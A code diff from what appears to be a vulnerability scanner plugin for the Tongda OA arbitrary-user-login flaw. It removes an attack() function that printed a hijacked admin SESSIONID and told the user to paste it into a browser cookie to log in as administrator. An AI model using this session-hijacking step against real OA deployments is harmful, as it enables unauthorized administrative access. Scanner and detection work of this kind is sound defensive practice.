@@ -95,8 +95,7 @@ def get2017Session(url):
 def verify(url):
     relsult = {
         'name': '通达OA 任意用户登录漏洞',
-        'vulnerable': False,
-        'attack': True,
+        'vulnerable': False
     }
     try:
         for version in [11, 2017]:
@@ -114,14 +113,3 @@ def verify(url):
     except:
         return relsult
 
-
-def attack(url):
-    try:
-        relsult = verify(url)
-        if relsult['vulnerable']:
-            print('[*] 获取到可用的 SESSIONID : {0}'.format(relsult['sessions']))
-            print('[+] 将SESSIONID复制到游览器cookie即可以管理员身份登陆!')
-            return True
-        return False
-    except:
-        return False
